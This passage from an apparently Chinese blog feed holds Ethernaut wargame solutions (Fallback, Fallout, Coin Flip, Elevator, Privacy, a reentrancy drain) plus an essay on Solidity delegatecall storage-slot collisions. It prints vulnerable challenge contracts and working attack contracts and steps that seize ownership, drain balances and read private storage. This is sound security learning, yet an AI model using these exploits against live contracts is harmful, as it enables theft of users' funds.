class="line"></span><br><span class="line">    constructor(address payable _addr) public payable &#123;</span><br><span class="line">        target&#x3D;_addr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function step1() public payable&#123;</span><br><span class="line">        target.call&#123;value: amount&#125;(abi.encodeWithSignature(&quot;donate(address)&quot;,address(this)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setp2() public payable &#123;</span><br><span class="line">        target.call(abi.encodeWithSignature(&quot;withdraw(uint256)&quot;,amount));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    fallback () external payable&#123;</span><br><span class="line">        target.call(abi.encodeWithSignature(&quot;withdraw(uint256)&quot;,amount));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>注意第一步第二步最好分开写，否则可能造成交易超过gas limit的上限导致执行失败</p><ul><li>解题步骤<br>按照step1，2执行即可<br><img src="../images/ethernaut/e10/01.png" alt=""><br>可以看到原合约已经没有token了。而我们的账户有了很多，攻击成功。<br><img src="../images/ethernaut/e10/02.png" alt=""></li></ul><h1 id="11-Elevator"><a href="#11-Elevator" class="headerlink" title="11 Elevator"></a>11 Elevator</h1><p>这道题其实考的是编程时的一个逻辑漏洞<br>先看代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">interface Building &#123;</span><br><span class="line">  function isLastFloor(uint) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract Elevator &#123;</span><br><span class="line">  bool public top;</span><br><span class="line">  uint public floor;</span><br><span class="line"></span><br><span class="line">  function goTo(uint _floor) public &#123;</span><br><span class="line">    Building building &#x3D; Building(msg.sender);</span><br><span class="line"></span><br><span class="line">    if (! building.isLastFloor(_floor)) &#123;</span><br><span class="line">      floor &#x3D; _floor;</span><br><span class="line">      top &#x3D; building.isLastFloor(floor);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>题目想要我们到达顶层，也就是把<code>top</code>变为true，但是我们明显能看到想要进入<code>goTo(uint)</code>中的判断条件，<code>building.isLastFloor(_floor)</code>就必须是<code>false</code>，<code>top</code>也等于这个值，乍一看想要<code>top=true</code>好像是个不可能的事。但由于<code>Building</code>是个接口，而<code>isLastFloor</code>则是一个抽象函数，这里<code>Building(msg.sender)</code>远程调用我们传入的合约，因此我们可以自己设计这个函数的具体内容。</p><blockquote><p>其实在这里两次调用了<code>building.isLastFloor(floor)</code>，他们的返回值一定是一样的吗？既然我们可以自定义函数，我们就可以在函数里面做一些变动让判断条件在第二次调用时，返回相反的值。</p></blockquote><p>攻击合约：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">interface Elevator &#123;</span><br><span class="line">  function goTo(uint _floor) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract MyBuilding&#123;</span><br><span class="line">    uint temp &#x3D; 5;</span><br><span class="line">    Elevator e;</span><br><span class="line">    function isLastFloor(uint i) external returns (bool)&#123;</span><br><span class="line">        if(temp &#x3D;&#x3D; i)&#123;</span><br><span class="line">            temp &#x3D; 6;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function dosome() public&#123;</span><br><span class="line">        address adr &#x3D; 0xd8b4056b73Cd9E7890a32548cEAd96D6116B52ae;&#x2F;&#x2F;Elevator地址</span><br><span class="line">        e &#x3D; Elevator(adr);</span><br><span class="line">        &#x2F;&#x2F; adr.call(abi.encodeWithSignature(&quot;goTo(uint256)&quot;,5));</span><br><span class="line">        e.goTo(5);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>可以看到，在第一次调用之后我就把temp的值变了，那么第二次再进行判断时，就会返回true。</p><ul><li>解题步骤<br>执行dosome()即可</li></ul><h2 id="12-Privacy"><a href="#12-Privacy" class="headerlink" title="12 Privacy"></a>12 Privacy</h2><p>这个题和前面08 Vault几乎一样，实质就是告诉我们以太坊中的储存，就算是private修饰，他也是可以被访问到的，比如用web3脚本<br><code>web3.eth.getStorageAt()</code>就可以轻松访问到。<br>先看代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Privacy &#123;</span><br><span class="line"></span><br><span class="line">  bool public locked &#x3D; true;</span><br><span class="line">  uint256 public ID &#x3D; block.timestamp;</span><br><span class="line">  uint8 private flattening &#x3D; 10;</span><br><span class="line">  uint8 private denomination &#x3D; 255;</span><br><span class="line">  uint16 private awkwardness &#x3D; uint16(now);</span><br><span class="line">  bytes32[3] private data;</span><br><span class="line"></span><br><span class="line">  constructor(bytes32[3] memory _data) public &#123;</span><br><span class="line">    data &#x3D; _data;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function unlock(bytes16 _key) public &#123;</span><br><span class="line">    require(_key &#x3D;&#x3D; bytes16(data[2]));</span><br><span class="line">    locked &#x3D; false;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>我们只要获得key就可以通关，也就是合约中的<code>data</code>,<br>直接获取即可。</p><ul><li>解题步骤<ol><li>用<code>web3.eth.getStorageAt(&#39;0xe1442525366a0cC8e2D25E480B0ACf47FE291Ecc&#39;,5)</code>得到data<br><img src="04.png" alt=""></li><li>然后由于require中的判断是去前16个byte，去前32位执行unlock方法即可<br><img src="05.png" alt=""></li></ol></li></ul>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ethernaut </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Delegatecall</title>
      <link href="/delegatecall/"/>
      <url>/delegatecall/</url>
      
        <content type="html"><![CDATA[<h1 id="Solidity之DelegateCall"><a href="#Solidity之DelegateCall" class="headerlink" title="Solidity之DelegateCall"></a>Solidity之DelegateCall</h1><hr><pre><code>author：Thomas_Xu</code></pre><p>在Solidity中，如果只是为了代码复用，我们会把公共代码抽出来，部署到一个library中，后面就可以像调用C库、Java库一样使用了。但是library中不允许定义任何storage类型的变量，这就意味着library不能修改合约的状态。如果需要修改合约状态，我们需要部署一个新的合约，这就涉及到合约调用合约的情况。</p><h2 id="三种调用函数"><a href="#三种调用函数" class="headerlink" title="三种调用函数"></a>三种调用函数</h2><p>  在 Solidity 中，call 函数簇可以实现跨合约的函数调用功能，其中包括 call、delegatecall 和 callcode 三种方式。<br/></p><p>  他们的异同点如下：</p><ul><li><strong>call</strong>: 调用后内置变量 msg 的值会修改为调用者，执行环境为被调用者的运行环境</li><li><strong>delegatecall</strong>: 调用后内置变量 msg 的值不会修改为调用者，但执行环境为调用者的运行环境（相当于复制被调用者的代码到调用者合约）</li><li><p><strong>callcode</strong>: 调用后内置变量 msg 的值会修改为调用者，但执行环境为调用者的运行环境</p><blockquote><p>注意：”callcode”已被弃用，取而代之的是” delegatcall “</p></blockquote></li><li><p><strong>CALL vs. CALLCODE</strong></p><blockquote><p>CALL和CALLCODE的区别在于：代码执行的上下文环境不同。</p></blockquote><p>具体来说，CALL修改的是被调用者的storage，而CALLCODE修改的是调用者的storage。<br><img src="Delegatecall01.png" alt=""></p></li><li><p><strong>CALLCODE vs. DELEGATECALL</strong><br>可以认为<code>DELEGATECALL</code>是<code>CALLCODE</code>的一个bugfix版本，官方已经不建议使用<code>CALLCODE</code>了。<br/></p><blockquote><p>CALLCODE和DELEGATECALL的区别在于：msg.sender不同。</p></blockquote><p>具体来说，DELEGATECALL会一直使用原始调用者的地址，而CALLCODE不会。<br><img src="Delegatecall02.png" alt=""></p></li></ul><h1 id="delegatecall的细节问题"><a href="#delegatecall的细节问题" class="headerlink" title="delegatecall的细节问题"></a>delegatecall的细节问题</h1><p>  先来看一段代码：<br>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">contract calltest &#123;</span><br><span class="line">  address public c;</span><br><span class="line">  address public b;</span><br><span class="line"> </span><br><span class="line">  function test() public returns (address a)&#123;</span><br><span class="line">      a&#x3D;address(this);</span><br><span class="line">      b&#x3D;a;</span><br><span class="line"> </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract compare &#123;</span><br><span class="line">    address public b;</span><br><span class="line">    address public c;</span><br><span class="line">    address testaddress &#x3D; address of calltest;</span><br><span class="line">    function withdelegatecall()&#123;</span><br><span class="line">        testaddress.delegatecall(bytes4(keccak256(&quot;test()&quot;)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>  看起来似乎没什么问题，但是两个合约的b与c向量的位置不同，我们来看一下执行的结果.<br>  b没有被赋值，反而是c被赋值了。<br>  在这里我们要关注一个EVM层面的问题，<strong>如何保存字段变量到存储</strong></p><p>  简单来说，EVM为字段变量分配槽号（slot number），第一个被申明的占0号槽位，以此类推。</p><blockquote><p>在EVM中，它在智能合约存储中有2^256个插槽，每个插槽可以保存32字节大小的数据。 </p></blockquote><p>  <br/><br>  我们知道使用delegatecall时代码执行的上下文是当前的合约，这代表使用的存储也是当前合约，当然这里指的是storage存储，然而我们要执行的是在目标合约那里的opcode，当我们的操作涉及到了storage变量时，其对应的访存指令其实是硬编码在我们的操作指令当中的，而EVM中访问storage存储的依据就是这些变量的存储位，对于上面的合约我们执行的汇编代码为sload——即访存指令，给定的即访问一号存储位，在我们的主合约中即对应变量c，在calltest合约中则对应于变量b，所以事实上调用delegatecall来使用storage变量时其实依据并不是变量名而是变量的存储位，这样的话我们就可以达到覆盖相关变量的目的</p><p>  参考：<br>  <a href="https://blog.csdn.net/Fly_hps/article/details/81218219" target="_blank" rel="noopener">delegatecall杂谈</a></p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂谈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ethernaut 题解 01-06</title>
      <link href="/2022-11-03-ethernaut01/"/>
      <url>/2022-11-03-ethernaut01/</url>
      
        <content type="html"><![CDATA[<h1 id="Ethernaut靶场刷题记录-1-6"><a href="#Ethernaut靶场刷题记录-1-6" class="headerlink" title="Ethernaut靶场刷题记录(1-6)"></a>Ethernaut靶场刷题记录(1-6)</h1><hr><pre><code>author：Thomas_Xu</code></pre><h2 id="01-FallBack"><a href="#01-FallBack" class="headerlink" title="01 FallBack"></a>01 FallBack</h2><p>这道题是比较简单的，合约的逻辑有问题导致出现漏洞<br/><br>我们先来了解一下receive和fallback的区别：</p><blockquote><p><strong>receive():</strong><br>    一个合约只能有一个receive函数，该函数不能有参数和返回值，需设置为external，payable；<br><strong>fallback():</strong><br>    一个合约只能有一个receive函数，该函数不能有参数和返回值，需设置为external；<br>    可设置为payable；</p></blockquote><p>当本合约的其他函数不匹配调用，或调用者未提供任何信息，且没有receive函数，fallback函数被触发；<br>当本合约收到ether但并未被调用任何函数，未接受任何数据，receive函数被触发；</p><p>先看代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#39;..&#x2F;SafeMath.sol&#39;;</span><br><span class="line"></span><br><span class="line">contract Fallback &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  mapping(address &#x3D;&gt; uint) public contributions;</span><br><span class="line">  address payable public owner;</span><br><span class="line"></span><br><span class="line">  constructor() public &#123;</span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">    contributions[msg.sender] &#x3D; 1000 * (1 ether);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier onlyOwner &#123;</span><br><span class="line">        require(</span><br><span class="line">            msg.sender &#x3D;&#x3D; owner,</span><br><span class="line">            &quot;caller is not the owner&quot;</span><br><span class="line">        );</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  function contribute() public payable &#123;</span><br><span class="line">    require(msg.value &lt; 0.001 ether);</span><br><span class="line">    contributions[msg.sender] +&#x3D; msg.value;</span><br><span class="line">    if(contributions[msg.sender] &gt; contributions[owner]) &#123;</span><br><span class="line">      owner &#x3D; msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function getContribution() public view returns (uint) &#123;</span><br><span class="line">    return contributions[msg.sender];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function withdraw() public onlyOwner &#123;</span><br><span class="line">    owner.transfer(address(this).balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);</span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>题目中给到的SafeMath的地址已经获取不到了，我直接选择找了老版本的SafeMath源码在我本地拉取下来。或者也可以直接用<code>import &quot;@openzeppelin/contracts-ethereum-package/contracts/math/SafeMath.sol&quot;;</code>路径代替。<br/></p><p>题目想要我们获得合约的所有权，<code>owner</code>再使用<code>withdraw</code>提取出来</p><ul><li><p>解题思路<br>  阅读完源码发现此合约的<code>receive</code>函数是有明显漏洞的，我们只需要向此函数转发出一笔转账交易即可将<code>owner</code>的所有权改为自己</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">receive() external payable &#123;</span><br><span class="line">    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);</span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  当然，为了达成<code>receive</code>中的require限制条件，我们还需要执行一次<code>contribute()</code>来将我们的<code>contributions[msg.sender] &gt; 0</code><br/><br>  在获得<code>owner</code>后，执行<code>withdraw()</code>即可通关。</p></li><li><p>解题步骤</p><ol><li>在控制台中调用<code>contract.contribute({value:1)</code>在不带单位的情况下默认单位为<code>wei</code><br><img src="01.png" alt=""></li><li>可以使用<code>contract.address</code>命令查看合约地址，然后使用metamask给合约地址转一笔账<br><img src="02_1.png" alt=""><br><img src="02_2.png" alt=""></li><li>此时<code>owner</code>应该已经到了，我们来看一下：<br><img src="03.png" alt=""></li><li>执行<code>withdraw()</code>函数进行提款<br><img src="04.png" alt=""></li><li>通关<br><img src="05.png" alt=""></li></ol></li></ul><h2 id="02-Fallout"><a href="#02-Fallout" class="headerlink" title="02 Fallout"></a>02 Fallout</h2><p>  emmm很白痴的关卡<br>  先看代码</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#39;..&#x2F;SafeMath.sol&#39;;</span><br><span class="line"></span><br><span class="line">contract Fallout &#123;</span><br><span class="line">  </span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  mapping (address &#x3D;&gt; uint) allocations;</span><br><span class="line">  address payable public owner;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  &#x2F;* constructor *&#x2F;</span><br><span class="line">  function Fal1out() public payable &#123;</span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">    allocations[owner] &#x3D; msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier onlyOwner &#123;</span><br><span class="line">          require(</span><br><span class="line">              msg.sender &#x3D;&#x3D; owner,</span><br><span class="line">              &quot;caller is not the owner&quot;</span><br><span class="line">          );</span><br><span class="line">          _;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">  function allocate() public payable &#123;</span><br><span class="line">    allocations[msg.sender] &#x3D; allocations[msg.sender].add(msg.value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function sendAllocation(address payable allocator) public &#123;</span><br><span class="line">    require(allocations[allocator] &gt; 0);</span><br><span class="line">    allocator.transfer(allocations[allocator]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function collectAllocations() public onlyOwner &#123;</span><br><span class="line">    msg.sender.transfer(address(this).balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function allocatorBalance(address allocator) public view returns (uint) &#123;</span><br><span class="line">    return allocations[allocator];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  题目要求获得合约的所有权。<br>  我看了这个合约很久，一直没找到可以攻击的地方……直到我看到了<br>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* constructor *&#x2F;</span><br><span class="line">  function Fal1out() public payable &#123;</span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">    allocations[owner] &#x3D; msg.value;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><br>  仔细看这个构造函数的名字，我们会发现<code>Fal1out</code>中间居然有个<code>1</code>关键是他还在上面注释了<code>constructor</code>就很坑。<br/><br>  那既然它不是个构造函数，并且具有构造函数的功能，那我们直接调用这个错误的“构造函数”就可以获得合约的所有权了。</p><blockquote><p>构造函数最好用<code>constructor() public {……}</code>的写法</p><ul><li>解题步骤<ol><li>调用<code>fal1out</code>函数<br><img src="06.png" alt=""></li><li>可以看到此时我们已经获得了合约的所有权<br><img src="07.png" alt=""></li><li>通关<br><img src="suc.png" alt=""></li></ol></li></ul></blockquote><h2 id="03-Coin-Flip"><a href="#03-Coin-Flip" class="headerlink" title="03 Coin Flip"></a>03 Coin Flip</h2><p>这是一个和区块结构有关的漏洞，由于用<code>blockhash(block.number.sub(1))</code>的方式计算上一区块的哈希的方式是极容易被攻击利用的。<br/><br>先看代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#39;..&#x2F;SafeMath.sol&#39;;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  uint256 public consecutiveWins;</span><br><span class="line">  uint256 lastHash;</span><br><span class="line">  uint256 FACTOR &#x3D; 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">  constructor() public &#123;</span><br><span class="line">    consecutiveWins &#x3D; 0;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function flip(bool _guess) public returns (bool) &#123;</span><br><span class="line">    uint256 blockValue &#x3D; uint256(blockhash(block.number.sub(1)));</span><br><span class="line"></span><br><span class="line">    if (lastHash &#x3D;&#x3D; blockValue) &#123;</span><br><span class="line">      revert();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lastHash &#x3D; blockValue;</span><br><span class="line">    uint256 coinFlip &#x3D; blockValue.div(FACTOR);</span><br><span class="line">    bool side &#x3D; coinFlip &#x3D;&#x3D; 1 ? true : false;</span><br><span class="line"></span><br><span class="line">    if (side &#x3D;&#x3D; _guess) &#123;</span><br><span class="line">      consecutiveWins++;</span><br><span class="line">      return true;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      consecutiveWins &#x3D; 0;</span><br><span class="line">      return false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>这个合约是一个“掷硬币猜正反”的游戏，要求连续猜对10次极为通关。<br/><br>先来分析一下合约：<br><code>block.number</code>可以用来获取当前交易对应block的编号，而这里减1获取的就是前一个block的编号，而<code>blockhash(id)</code>可以获取对应id的block的hash值，然后uint256将其转换为16进制对应的数值。其中给的factor就是<code>2^{256}/2</code>，所以每次做完除法的结果有一半几率是0，一半是1。<br>这里补充一下几个知识：</p><ul><li><p>补充</p><ul><li><strong>Solidity block对象</strong><br>block.coinbase (address): 当前块的矿工的地址<br>block.difficulty (uint):当前块的难度系数<br>block.gaslimit (uint):当前块gas的上限<br>block.number (uint):当前块编号<br>block.blockhash (function(uint) returns (bytes32)):函数，返回指定块的哈希值，已经被内建函数blockhash所代替<br>block.timestamp (uint):当前块的时间戳</li></ul><p><br/></p><ul><li><p><strong>Revert</strong><br>revert是solidity中的一种错误处理机制，<br>而revert一旦触发，会导致当前调用中的所有更改都被还原并将错误数据传递回调用者。<br>revert由两种使用形式：</p><ul><li>revert ：<code>revert CustomError（arg1， arg2）;</code>该语句将自定义错误作为不带括号的直接参数</li><li>revert() ：<code>revert（）;revert（“description”）;</code>出于向后兼容的原因，还有一个函数，它使用括号并接受字符串</li></ul><p><br/></p></li><li><p><strong>Revert与Require与Assert</strong></p><ul><li>Assert： 可以理解为严厉一点的判断，如果判断失败，将会burn掉你的gas</li><li>Require: 可以理解为温和一点的判断，就算判断失败，gas会返回给调用者</li><li>Revert ：revert的用法和throw很像，也会撤回所有的状态转变。但是它有两点不同：<ol><li>它允许你返回一个值</li><li>它会把所有剩下的gas退回给caller</li></ol></li></ul></li></ul><p>详情参见<a href="https://docs.soliditylang.org/en/latest/control-structures.html#revert-statement" target="_blank" rel="noopener">solidity参考文档</a><br><br/></p></li><li><p>漏洞分析：<br>本题的漏洞就出在通过<code>block.blockhash(block.number - 1)</code>获取负一高度的区块哈希来生成随机数的方式是极易被攻击利用的。</p><blockquote><p>原理是在区块链中，一个区块包含多个交易，我们可以先运行一下上述除法计算的过程获取结果究竟是0还是1，然后再发送对应的结果过去，区块链中块和快之前的间隔大概有10秒，手动去做会有问题，而且不能保证我们计算的合约是否和题目运算调用在同一个block上，因此需要写一个攻击合约完成调用。我们在攻击合约中调用题目中的合约，可以保证两个交易一定被打包在同一个区块上，因此它们获取的<code>block.number.sub(1)</code>是一样的。</p></blockquote><p>其实就是利用了一个区块中可能由多个交易，而我们可以自己创建一个交易，执行与题目中一样的语句后得到的<code>block.number.sub(1)</code>是一样的<br><br/></p><p>攻击合约代码如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#39;..&#x2F;SafeMath.sol&#39;;</span><br><span class="line">import &#39;.&#x2F;CoinFlip.sol&#39;;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  uint256 public consecutiveWins;</span><br><span class="line">  uint256 lastHash;</span><br><span class="line">  uint256 FACTOR &#x3D; 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line">  address adr &#x3D; 0xFd288CbD59B3f74A70B10730a076Ad0b59479C56;&#x2F;&#x2F;被攻击合约地址</span><br><span class="line">  CoinFlip coin &#x3D; CoinFlip(adr);</span><br><span class="line"></span><br><span class="line">  function dosome() public returns (bool) &#123;</span><br><span class="line">    uint256 blockValue &#x3D; uint256(blockhash(block.number.sub(1)));</span><br><span class="line"></span><br><span class="line">    if (lastHash &#x3D;&#x3D; blockValue) &#123;</span><br><span class="line">      revert();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lastHash &#x3D; blockValue;</span><br><span class="line">    uint256 coinFlip &#x3D; blockValue.div(FACTOR);</span><br><span class="line">    bool side &#x3D; coinFlip &#x3D;&#x3D; 1 ? true : false;</span><br><span class="line">    coin.flip(side);</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>部署成功后只需要执行10次<code>dosome</code>方法即可</p><blockquote><p>我试过编写一个函数用一个for循环来控制<code>dosome()</code>执行的次数，最终以失败告终，应该是由于循环多了之后造成gas超过了gaslimit的上限。<br>解题步骤：</p></blockquote></li></ul><ol><li>将我们的攻击合约部署在测试链上</li><li>执行10次<code>dosome()</code>函数</li><li>通关<br><img src="11.png" alt=""></li></ol><h2 id="04-Telephone"><a href="#04-Telephone" class="headerlink" title="04 Telephone"></a>04 Telephone</h2><p>此题考查<code>tx.origin</code>和<code>msg.sender</code>的区别。没有什么难点<br>先看代码<br><figure 